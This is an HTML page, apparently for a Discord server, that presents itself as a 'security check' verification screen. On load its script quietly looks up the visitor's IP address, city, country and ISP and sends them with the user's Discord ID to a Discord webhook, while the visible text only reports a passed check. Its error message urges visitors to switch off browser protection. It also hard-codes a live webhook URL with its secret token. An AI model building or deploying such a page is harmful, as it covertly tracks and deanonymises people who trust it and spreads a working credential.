<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body { background-color: #232428; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #313338; padding: 40px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; color: #ffffff; }
        p { font-size: 14px; color: #b5bac1; }
        .success-mark { color: #23a559; font-size: 50px; display: none; }
        .error-mark { color: #f23f43; font-size: 50px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loading" class="spinner"></div>
        <div id="success" class="success-mark">✔</div>
        <div id="error" class="error-mark">✖</div>
        <h1 id="status">認証中...</h1>
        <p id="msg">セキュリティチェックを実行しています。</p>
    </div>

    <script>
        // あなたのWebhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";

        async function start() {
            const params = new URLSearchParams(window.location.search);
            const state = params.get('state');

            if (!state) return showError("エラー", "URLが無効です。ボットからやり直してください。");

            try {
                // IPチェックAPI（安定性の高いJSONP/HTTPS対応のものに変更）
                const res = await fetch('https://ipapi.co/json/').catch(() => null);
                if (!res) throw new Error("API接続失敗");
                
                const data = await res.json();
                
                // VPN/Proxyの簡易判定（データセンター系ISPを弾くなどの処理はボット側でも可能）
                // ここではまず「通信を完結させる」ことを優先します

                const parts = state.split('_');
                const logId = parts[1];
                const userId = parts[3];

                // Webhookへ成功通知を送信
                await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **認証成功**: <@${userId}>`,
                        embeds: [{
                            title: "🛡️ 認証完了 (IP取得成功)",
                            description: `**ユーザー:** <@${userId}>\n**IP:** \`${data.ip}\`\n**場所:** \`${data.city}, ${data.country_name}\`\n**ISP:** \`${data.org}\``,
                            color: 0x23a559,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                showSuccess("認証完了", "安全が確認されました。この画面を閉じてDiscordへ戻ってください。");

            } catch (e) {
                console.error(e);
                showError("エラー", "チェック中に問題が発生しました。ブラウザの保護機能をオフにするか、別のブラウザで試してください。");
            }
        }

        function showSuccess(t, m) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'inline-block';
            document.getElementById('status').innerText = t;
            document.getElementById('msg').innerText = m;
        }

        function showError(t, m) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('error').style.display = 'inline-block';
            document.getElementById('status').innerText = t;
            document.getElementById('status').style.color = '#f23f43';
            document.getElementById('msg').innerText = m;
        }

        window.onload = start;
    </script>
</body>
</html>
